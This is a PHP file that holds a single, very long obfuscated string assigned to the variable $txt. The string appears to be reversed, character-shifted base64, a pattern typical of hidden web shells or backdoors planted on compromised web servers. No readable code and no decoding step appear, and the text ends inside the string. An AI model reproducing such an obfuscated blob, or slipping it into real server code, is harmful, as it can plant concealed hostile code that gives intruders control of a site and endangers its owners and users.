<?php 

$txt ="==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 t4PVqqvpafSISq0KxNvYtpvV9HJqfSzqtVFMgSzov0GMgSzotVPq4ITqv0GMjyUqtDKqj5Jn8NPV tNPVtNPVXbGMgSzoyWSVtNPVtNPVtbtCvD3piOaV9D2obEKMgOFol9zM8NPVtNvPaNlobAJMtNPV tNPVtNPVtNPVXfUVcxFKaR3WoEIEU9SWbDKMmAKntLvWtxFKaV3WoEIEU9SWbxUqj1JMutPVzyTV tNPVtNPVtbjrtxFXqqvpafSISq0KxtPqyA3pcuPVzyTVtNPVX0UVtNPVXfmW+0zpiM2Y8NPVtNPV tNPVtNPVtbtCvDJLikTp1WFCy1JLhOvVxS2ofOKIv0GM1kJL2OvV0yJovI3pv0GMjyUqtDKqj5Jn 8NPVtNPVtNPVtNPVtbtCvDJLikTpI9TIykJnzWFCxyTVvDJLikTpI9TIykJnzWFCy1JLhOvVykJn zWFCyOKr0OPq1OaockQVtNPVtNPVtNPVtNvP6DJLikTp1Olo0OFMfyzMtD3LykJMGOPVtNPVtNPV tNPVtbtCvHGY41TV10PqgWFCmAKLfATVvRTquEJYgW3oz9PqlSTpcEUo11zV9HTp5E3LhITVvD3p iOaV9D2obEKMgOFol9zM8NPVtNPVtNPVtNPVtbjWt8TnwITVtNPVtNPVtbjrtxFXqqPMu9TojI3W oEIEU9SWbDKMmAKnbNvMcOPVtNvP9OPVtNvP9OPVtNPVtNPVXfGXv4QqjyzpwA3Y8fGXa0Qp/pPX yAJLfOKMl5voiyTquA2of5lqiEzocqaC0OKnlA2p8VPXt8TnwITVtNPVtNPVtNPVtNvP7OFXcDIE U9SWbxUqj1JMbNvMcOPVtNPVtNPVXfUVyAUoyOFstNPVtbjBv4GMfWJL09PCX4Grx9zL09PCtNvV t8TnwITVtNPVtNPVtbDstNPVtNPVtNvP7VvP+VUqijQVtNPVX4QM0kQVtNPVtNPVtNPVX4GLijwC c9PC+pFM1WUqa0woyETMcuJYuyzpuOlWbAKLlEKYuMTVuMTVhIJMlqJY0uKM0qFCmAKLfATVckwC aVPVhNFMfyzMxNvYtVFCxMvVt4PVcxPFHSRHbtTquOIMx92LhITXyE2ow5JMfWKqt4PVv0Gp/pFC zIzpbOlWcpFVyWKqGqPXgWKnz52owOvolIUqyW3W9f2Lck2Lh9TVtpFM0IToyE0W9HTo0yTqtRTC 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 fWJL0kwPaNlobAJMtNPVtNPVtNvP9OPVtNPVtNPVX0UVtNPVtNPVtNPVtNvP9OPVtNPVtNPVtNPV tNPVtNvP7xvnv9TWtjlpykJnzEPXbAKqj9IruWapuOPVtNPVtNPVtNPVtNPVtNPVtNPVXfUVcxvn v92K3IzoxtFMfyzMsAKnbNvMcI2pfITV9OPVtNPVtNPVtNPVtNPVtNvP7xvnv9TWtjlplITMf9zM xtPnmIUpsyKLlWKLtNPVtNPVtNPVtNPVtNPVtNPVtNvP7OFXcbzLi91qy5TWbVKnx91pcuPVzyTV tNPVtNPVtNPVtNPVtNPVXfwnv9TWt4PVa8lWt4PVVEIDDOFCtbzLi91qy5TWtNPVtNPVtNPVtNPV tNPVtbDstNPVtNPVtNPVtNPVtNPVtbjByIaocEaoiATVtNPVtNPVtNPVtNPVtNPVtNPVtbjrtxlW h4lWt0GCtbzLiEPV8kUVa4lWt0GCtbzLiEPXtLJntNPVtNPVtNPVtNPVtNPVtbjrtxvnv9TWtZKL tbzLi9SnwEKMzEPXtt2LuIzpiMTVtNPVtNPVtNPVtNvP7xPX5SzplSTV9NlpykJnzEPVtNPVtNPV tNPVtNvP7xPX5SzplSTV9NlplITMf9zMxNPVtNPVtNPVtNPVtbjBctRIOOSXlyTMhS2LmOFCtbzL i9SnwEKMzEPVtNPVtNPVtNPVtNvP7OFXctRIOOSXykzLuEJLyW3KmyTXtLJntNPVtNPVtNvPmITo cMTVbATqyM2YiNPVtNPVtNPVXbjrtxFXqqPpafSISq0KxtPqyA3pcuPVzyTVtNPVXbtP7xlW+LKL h9PCX4wqcE2Y8bNVXNvCu9PC+42o0EKqv9PCS10GV5wVlI2MhSTMgDUryEUVeWKLx1vo0WTVhEaL v0mpmSTowOvVh9Tq0IaLv0GMjyUqt42o0EKqvkwCv8wV9LJMluTVukwP+R2Y84woiEUq1W2Y8HTo cMRVxS2ofOKI+VvoiEUq1WzV9HTp5EUVv4JMyW3MgDUryEUVeWKLx1vo0WTVhEaLv0mpmSTowOvo iEUq1WTC+VlWt4PVcxPFHSRHbtTquOIMx92LhITXyE2ow5JMfWKqt4PVa0GpzDJLikTp19wV9LJM luTVukwP+VFMhyTohyJYgW3ozWFCmAKLfATV2yTM8btC2yTMijwPatPViu2LyOPVtNvP9OPVtNvP 7VlY+R2Y88PVvNvYtDapuO3KlyTMxNvYtVvCaVPViu2LyOPVtNPVtNPVX0UVtNPVtNPVtbjBvHcc tYPViu2LyOPVtNPVtNPVtNPVtNPVtNvPcDJnxNFCuNFnxtPVzyTVtNPVtNPVtNPVtNvP7xFKcElJ muTquOUWtjvVLnX4vNPYvbwVbH2LukTpyW3KlE3pt8TnwITVtNPVtNPVtNPVtNvP7OFXefFnxNlB xyTWt0QCtxTWtfQZt0QVcEPXtV3ozOPVtNPVtNPVXfwV9N3Ca0wMyWUntpFMh9zog42ocEKLl92L yEJY0uKM0OvpyqzouEJY0uKM0qFCmAKLfATVukwVt8TnwITVtNPVtNPVtbjByIaocEaoiATVtNPV tNPVtNPVtNvPcplWt0GCtDapuO3KlyTMxtPVzyTVtNPVtNPVtbDstNPVtNPVtNvP7HJqhyTqh92L tNPVtNPVtNPVtNPVXfwV+R2Y88vCvj1Y9N3CvjICzIzpbOlWy52oh1voiyTquW3owITMgDUryEUV lI2MhSTMgDUryE3W9Z3puk2LtRTCvNlobAJMtNPVtNPVtNPVtNPVXfGM1WUqt0QVuEPVtNPVtNPV tNPVtNvP7OFXjNFC9NPMcEPVzLPVapPV90QV0WKLj9ypcETWbNvMcOPVtNPVtNPVXfUVcDapuO3K lyTMxNvC9NPMcEPVmSTVmuTquOUWbNPnwSJMl9zMtNPVtbjBctTquOUWtjlWipPXyE2ofOUryOFC tZUn0STpxNPVtNvP7xPFHSRHtjlWipPVfpPKpqPXyAJLfOKMl9yp0AUV9NPn0STpxNPVtNvPXfGX abtChSTpm9PCtNvC9NPFHSRHtNPV+VlZgZKotpzoc5zpuqKY0uKM0WFCmAKLfATVhSTpmkQVtbtC vDzouWaLgVKLvMKLhWFCmAKLfATV2yTM8NPVX4QVtVPqbqJnf1vpuWzqu5TVlSzL2Szov0mpmSTo wOvqu5TCXpPXt8TnwITVtNPVXfGXaNPVtNvP+LKnx9PCtNPVtNPVtNvP+LKnx9PCtNPVtNPVtNvP +LKnx9PCtNPVtNPVtNvP+LKnx9PCX4GZb9PCFI2nuITGB9JnaITG+VFM1WUqv0GMfWJL0yTMyEao yEaoiATVvpzoccKLfWxV9Z3puk2LtRQn8NPVtNvP+VFMlyzMtfzpuEzV9Z3puk2LtLKnxkQVtNPV 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 zPhVtjvVInX4vtFruWapuOFCtVTWtNPVtNPVtNvP7xvV6VPVfVvYvNPYvjSKvNPYv8vVbxKLlWKL t0QVuEPVtNPVtNPVtbjrtNPVtbDXbEKLjEPXbEKLDITMiAzoyOvoiyTqw5JqzOPVtNvPX0UVtNPV X0UVtNPVtNPVtbjBaNvCc9PC+VFMfyzMgRzMtDJnf92pgRzMt4JMyW3MgDUryEaV9Z3puk2LtxTC aNvolIUqyWUVtNPVtNPVtNPVtNvP7OFMmkJMt0UVtNPVtNPVtbjBaNvCc9PC+Vlpd1FLzOlpx5JL lWJYuMTVhIJMlqJY0uKM0WFCmAKLfATVckmWt4zp1EKMlOPVtNPVtNPVtNPVtbjrtxvVmczVt0GC tDUryEPXtLJnyAUoyOFstNPVtNPVtNvP7pPV+x2Y84wVh9Tn0yUpgRzMtZUMhSzpv1FLzOvoyIzp a1Pq4ITqv0mpmSTowOFn8pPVhWKq0IzptNPVtNPVtNPVtNPVXfUVcVFrjWPV90QV0uKMxtPVzyJM mkJMt0UVtNPVtNPVtbjBaNvCc9PC+VlLcAKqg1FMfyzMgRzMtHzoiE3o1EJYuMTVhIJMlqJY0uKM 0WFCmAKLfATVckmWt4zp1EKMlOPVtNPVtNPVtNPVtbjrtxFXiyTM1STWtjPq4ITWbxKLlWKLs5Jn bNvMcI2pfITV9OPVtNPVtNPVXfmWt4GnijwCvZKMhyTogHTocMJYuMTVlSTo1qJMl1FLzOvoyIzp a1Pq4ITqv0mpmSTowOFn8pPVhWKq0IzptNPVtNPVtNPVtNPVXfUVcVPq4EaVt0GCtDUryEPXtLJn yAUoyOFstNPVtNPVtNvP7pPV+x2Y84wVmZ3pw1FLzOlpx5JLlWJYuMTVhIJMlqJY0uKM0WFCmAKL fATVckmWt4zp1EKMlOPVtNPVtNPVtNPVtbjrtxvVmA3LvNFC9NPq4ITWbNvMcI2pfITV9OPVtNPV tNPVXfmWt4GnijwCvZKMaSJoc1FLzOvpukJqaIzpgRzMt4JMyW3MgDUryEaV9Z3puk2LtxTCaNvo lIUqyWUVtNPVtNPVtNPVtNvP7OFXcZ3MgyTWtjPq4ITWbxKLlWKLs5JnbNvMcI2pfITV9OPVtNPV tNPVXfmWt4GnijwCvNUnj1FLzOlpx5JLlWJYuMTVhIJMlqJY0uKM0WFCmAKLfATVckmWt4zp1EKM lOPVtNPVtNPVtNPVtbjrtxvVf1TqbOaVt0GCtDUryEPV8kUVvNUnjWPV90QV0uKMxtPVzyJMmkJM t0UVtNPVtNPVtbjBaNvCc9PC+VFAf1Tqb1FLzOlpx5JLlWJYuMTVhIJMlqJY0uKM0WFCmAKLfATV ckmWt4zp1EKMlOPVtNPVtNPVtNPVtbjrtxvVgEUnvNFC9NPq4ITWtjUstVPogEUnvNFC9NPq4ITW bNvMcOPVtNPVtNPVX0UVtNPVtNPVtbjBaNvCc9PC+Vvpy1JouuJYuMTVxyToiAKYuMTVhIJMlqJY 0uKM0WFCmAKLfATVckmWt4zp1EKMlOPVtNPVtNPVtNPVtbjrtxvVmAKMwAJL0uzYvNFC9NFMfyzM xtPVzyJMmkJMt0UVtNPVtNPVtbjBaNvCc9PC+VlM1WJYuMTVxyToiAKYuMTVjWKLbAKYuMTVhIJM lqJY0uKM0WFCmAKLfATVckmWt4zp1EKMlOPVtNPVtNPVtNPVtbjrtxvVa9TosW3olWKMvNFC9NFM fyzMxtPVzyTVtNPVtNPVtbjBcxFMfyzMxtvoiy2phITq4IHMfyzMbVKM39ToiEap0AUV9NPq4ITW tNPVtNPVtNvP7xvVwOKovNPYv0zLyqaVtjvVaq2ovNPYvZQpgWPVfVvL00zVtjvVuEGovNPYvLKL 3WPX5SzplSTV9NlocEJquEPVtNPVtNPVtbjBcVPpvI2qvNPYvpzqmWPVfVlMhOaVtjvVjcTpvNPY vpJMjcTpvNPYvLJnzczVtjvVaITpdWPVfVlMjczVtjvVjuTpvNPYvDUryEaVtjvV0uUqvtFruWap uOFCtZ3MgyTWtNPVtNPVtNvP7OPVtNvPcHTocMTWb42owyHMfyzMt42ocE3LhIaMtNPVtbtP9OPV tNvP7xFZtjFXa4lWtjFMfyzMxtvpbAzplE3pbVUqmWJqmOvolIUqyWUVtNPVtNPVtbjrtNPVtbDX ykJnzEPXh9Jnm5JM0uKEykJnzOvoiyTqw5JqzOPVtNvPX0UVtNPVXfmpyEKrvEPVhWKq0IzptNPV tNPVtNvP9OPVtNPVtNPVXfmWmITq5WTVjpPV9NlpyEKrvEPVtNPVtNPVtNPVtNvP7OFMmkJMt0UV tNPVtNPVtbjBaHTq5WTVaNvYtZKM0yaLxNFCtZKM0yaLxNPVtNPVtNPVtNPVtbjrtxFZt0GCtZKM 0yaLxtPVzyJMmkJMt0UVtNPVtNPVtbjBaZKM0yaLtpPVhNlpyEKrvEPV9NlpyEKrvEPVtNPVtNPV tNPVtNvP7OFXkNvCtZKM0yaLxtPVzyJMmkJMt0UVtNPVtNPVtbjBaV0FtpPVhNFXlNPY0VQZkNlY tZKM0yaLxtPqu1zpiM2KlIzLgIaot0QVmITq5WTWtNPVtNPVtNPVtNPVXfUVcDwZjRQV94QVmITq 5WTWbNvMcI2pfITV9OPVtNPVtNPVXfmWP1RVaNvYtxvZtjvA3HQB0NGZt8PVmITq5WTWbDKLgW3o z9ypyWJo15TV9NlpyEKrvEPVtNPVtNPVtNPVtNvP7OFX2pGA4DQZkNFC+NlpyEKrvEPXtLJnyAUo yOFstNPVtNPVtNvP7pvDUOlWt4PVcVQVfDwZ4RQA3ZmAjRQViNlpyEKrvEPX0SJol9zMsWKMv1Jq hOFCtZKM0yaLxNPVtNPVtNPVtNPVtbjrtxPAltGZ0pmZ3NGZt0wCtZKM0yaLxtPVzyTVtNPVtNPV tbjrtNPVtbDXmITq5WTWbZUqc5JIycKnGEKLgW3ozOvoiyTqw5JqzOPVtNvPh9Jn0Azo1M2YiNPV tNvPXbNpbO3C8NPVtNvPX4wVyEKnbqKY0uKM0WFCmAKLfATV5E2ovkwPX4QMuITnijwP+HTo5E3p ijQVtNPVX0UVtNPVtNPVtbjBjLTZwNvBl9ToiATVtNPVtNPVtNPVtNvP7OvoyIzpa1Pq4ITqhNPV tNPVtNPVXbDstNPVtNPVtNvP7VKM05JniOUV6V3omWKqwOPVtNPVtNPVtNPVtbjBzMzMwNvBl9To iAJYlITMl9zLtNPVtNPVtNPVtNPVXfwMzM2Vtbwpik2owOPVtNPVtNPVtNPVtbjB05JMlSTpm5JL lEUV6Dzo19zpag2LuWTVtNPVtNPVtNPVtNvP7OvoiEUq1WJYxS2ofOKqgHTocMJY0y2nvI2qgbwB 